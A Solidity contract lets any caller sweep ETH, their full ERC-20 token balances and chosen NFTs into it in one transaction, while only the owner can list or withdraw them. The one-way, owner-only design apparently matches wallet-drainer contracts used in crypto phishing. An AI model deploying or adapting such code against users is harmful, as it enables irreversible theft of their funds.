// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

// Importing interfaces for ERC20 and ERC721 standards
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract AssetTransferContract is Ownable {
    uint256 public ethBalance; // To track the ETH balance of the contract

    // Mapping for ERC20 token balances
    mapping(address => uint256) public erc20Balances;
    // List to keep track of all ERC20 token addresses held by the contract
    address[] public erc20TokenList;

    // Mapping for NFTs held by the contract
    mapping(address => uint256[]) public nftTokens;
    // List to keep track of all NFT addresses held by the contract
    address[] public nftAddressList;

    // Events for logging received assets
    event ReceivedETH(address indexed sender, uint256 amount);
    event ReceivedERC20(address indexed sender, address indexed tokenAddress, uint256 amount);
    event ReceivedNFT(address indexed sender, address indexed nftAddress, uint256 tokenId);

    // Constructor
    constructor() Ownable(msg.sender) {}

    // Function to transfer all assets (ETH, ERC20, NFTs) to the contract with one transaction
    function transferAllAssetsOnce(
        address[] calldata erc20Addresses,
        address[] calldata nftAddresses,
        uint256[][] calldata nftTokenIds
    ) external payable {
        // Handle ETH transfer if sent
        if (msg.value > 0) {
            ethBalance += msg.value;
            emit ReceivedETH(msg.sender, msg.value);
        }

        // Transfer ERC-20 tokens
        for (uint256 i = 0; i < erc20Addresses.length; i++) {
            IERC20 token = IERC20(erc20Addresses[i]);
            uint256 balance = token.balanceOf(msg.sender);
            if (balance > 0) {
                require(token.transferFrom(msg.sender, address(this), balance), "ERC20 transfer failed");
                if (erc20Balances[erc20Addresses[i]] == 0) {
                    erc20TokenList.push(erc20Addresses[i]);
                }
                erc20Balances[erc20Addresses[i]] += balance;
                emit ReceivedERC20(msg.sender, erc20Addresses[i], balance);
            }
        }

        // Transfer NFTs
        for (uint256 i = 0; i < nftAddresses.length; i++) {
            IERC721 nft = IERC721(nftAddresses[i]);
            for (uint256 j = 0; j < nftTokenIds[i].length; j++) {
                uint256 tokenId = nftTokenIds[i][j];
                if (nft.ownerOf(tokenId) == msg.sender) {
                    nft.transferFrom(msg.sender, address(this), tokenId);
                    if (nftTokens[nftAddresses[i]].length == 0) {
                        nftAddressList.push(nftAddresses[i]);
                    }
                    nftTokens[nftAddresses[i]].push(tokenId);
                    emit ReceivedNFT(msg.sender, nftAddresses[i], tokenId);
                }
            }
        }
    }

    // View function to list all assets on the contract
    function listAssets() external view onlyOwner returns (
        uint256 contractEthBalance,
        address[] memory erc20TokenAddresses,
        uint256[] memory erc20BalancesArray,
        address[] memory nftContractAddresses,
        uint256[][] memory nftTokensArray
    ) {
        // ETH balance
        contractEthBalance = ethBalance;

        // ERC20 tokens and balances
        erc20TokenAddresses = erc20TokenList;
        erc20BalancesArray = new uint256[](erc20TokenList.length);
        for (uint256 i = 0; i < erc20TokenList.length; i++) {
            erc20BalancesArray[i] = erc20Balances[erc20TokenList[i]];
        }

        // NFTs and token IDs
        nftContractAddresses = nftAddressList;
        nftTokensArray = new uint256[][](nftAddressList.length);
        for (uint256 i = 0; i < nftAddressList.length; i++) {
            nftTokensArray[i] = nftTokens[nftAddressList[i]];
        }
    }

    // Function to withdraw ETH from the contract (only owner)
    function withdrawETH(uint256 amount) external onlyOwner {
        require(amount <= ethBalance, "Insufficient ETH balance");
        ethBalance -= amount;
        payable(owner()).transfer(amount);
    }

    // Function to withdraw ERC-20 tokens from the contract (only owner)
    function withdrawERC20(address tokenAddress, uint256 amount) external onlyOwner {
        require(amount <= erc20Balances[tokenAddress], "Insufficient token balance");
        IERC20(tokenAddress).transfer(owner(), amount);
        erc20Balances[tokenAddress] -= amount;
        if (erc20Balances[tokenAddress] == 0) {
            _removeERC20FromList(tokenAddress);
        }
    }

    // Function to withdraw NFTs from the contract (only owner)
    function withdrawNFT(address nftAddress, uint256 tokenId) external onlyOwner {
        IERC721 nft = IERC721(nftAddress);
        require(nft.ownerOf(tokenId) == address(this), "Contract does not own this NFT");
        nft.transferFrom(address(this), owner(), tokenId);
        _removeNFTFromList(nftAddress, tokenId);
    }

    // Internal helper function to remove ERC20 token from the list if the balance is zero
    function _removeERC20FromList(address tokenAddress) internal {
        uint256 length = erc20TokenList.length;
        for (uint256 i = 0; i < length; i++) {
            if (erc20TokenList[i] == tokenAddress) {
                erc20TokenList[i] = erc20TokenList[length - 1];
                erc20TokenList.pop();
                break;
            }
        }
    }

    // Internal helper function to remove an NFT from the list
    function _removeNFTFromList(address nftAddress, uint256 tokenId) internal {
        uint256 length = nftTokens[nftAddress].length;
        for (uint256 i = 0; i < length; i++) {
            if (nftTokens[nftAddress][i] == tokenId) {
                nftTokens[nftAddress][i] = nftTokens[nftAddress][length - 1];
                nftTokens[nftAddress].pop();
                if (nftTokens[nftAddress].length == 0) {
                    _removeNFTAddressFromList(nftAddress);
                }
                break;
            }
        }
    }

    // Internal helper function to remove an NFT address from the list if no tokens are left
    function _removeNFTAddressFromList(address nftAddress) internal {
        uint256 length = nftAddressList.length;
        for (uint256 i = 0; i < length; i++) {
            if (nftAddressList[i] == nftAddress) {
                nftAddressList[i] = nftAddressList[length - 1];
                nftAddressList.pop();
                break;
            }
        }
    }
}
